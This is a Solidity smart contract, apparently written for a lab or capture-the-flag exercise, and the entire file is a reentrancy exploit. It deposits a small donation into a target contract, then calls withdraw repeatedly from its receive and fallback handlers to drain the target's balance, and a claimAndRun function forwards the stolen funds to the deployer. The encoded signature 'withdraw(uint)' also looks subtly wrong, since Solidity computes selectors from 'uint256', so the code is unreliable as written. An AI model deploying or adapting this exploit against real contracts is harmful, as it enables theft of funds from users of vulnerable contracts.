// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract MaliciousContract {
    address payable public vulnerableScAddress;
    address payable public attacker;
    uint256 public constant attackValue = 0.001 ether;

    constructor(address _vulnerableScAddress) payable {
        vulnerableScAddress = payable(_vulnerableScAddress);
        attacker = payable(msg.sender);
    }

    receive() external payable {
        if (vulnerableScAddress.balance >= attackValue) {
            vulnerableScAddress.call(
                abi.encodeWithSignature("withdraw(uint)", attackValue)
            );
        }
    }

    fallback() external payable {
        if (vulnerableScAddress.balance >= attackValue) {
            vulnerableScAddress.call(
                abi.encodeWithSignature("withdraw(uint)", attackValue)
            );
        }
    }

    function attack() public payable {
        require(msg.value >= attackValue, "Need to send at least 0.001 eth.");
        // Donates minimum funds to be able to pass if(balances[msg.sender] >= _amount) control
        vulnerableScAddress.call{value: attackValue}(
            abi.encodeWithSignature("donate(address)", address(this))
        );

        // Triggers withraw vulnerability.
        vulnerableScAddress.call(
            abi.encodeWithSignature("withdraw(uint)", attackValue)
        );
    }

    function claimAndRun() public {
        require(msg.sender == attacker, "not your bounty, buddy.");
        attacker.transfer(address(this).balance);
    }
}
